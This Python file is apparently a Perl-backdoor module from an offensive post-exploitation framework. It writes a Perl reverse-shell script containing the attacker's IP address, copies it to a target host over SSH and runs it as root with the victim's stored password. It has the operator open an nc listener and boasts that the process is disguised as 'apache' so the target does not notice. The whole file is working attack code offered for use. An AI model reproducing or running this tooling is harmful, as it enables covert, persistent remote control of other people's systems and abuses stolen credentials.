from backdoor import *

class Perl(Backdoor):
    prompt = Fore.RED + "(perl) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using Perl module"
        self.core = core
        self.options = {
                "port"   : Option("port", 53921, "port to connect to", True),
                }
        self.allow_modules = True
        self.modules = {} 
 
    def get_command(self):
        return "echo " + self.core.curtarget.pword + " | sudo -S nohup perl ~/prsA.pl"

    def do_exploit(self, args):
        port = self.get_value("port")
        target = self.core.curtarget
        toW = 'backdoors/perl/prsA.pl'
        stringToAdd = ""
        fileToWrite = open(toW, 'w')

        with open ("backdoors/perl/prs1", "r") as myfile:
            data=myfile.read()
        data = data[:-1]#remove the last new line character.
        stringToAdd+=data + self.core.localIP

        with open ("backdoors/perl/prs2", "r") as myfile:
            data=myfile.read()
        stringToAdd+=data
        fileToWrite.write(stringToAdd)
        fileToWrite.close()

        raw_input("Run the following command: nc -v -n -l -p %s in another shell to start the listener." % port)
        target.scpFiles(self, 'backdoors/perl/prsA.pl', False)
        print("Moving the backdoor script.")

        target.ssh.exec_command("echo " + target.pword + " | sudo -S nohup perl prsA.pl")
        print("Perl backdoor on port %s attempted. It's named apache so the target won't see what's going on. If you stop the listener, the backdoor will stop, unless it is a cronjob." % port)

        for mod in self.modules.keys():
            print(INFO + "Attempting to execute " + mod.name + " module...")
            mod.exploit()







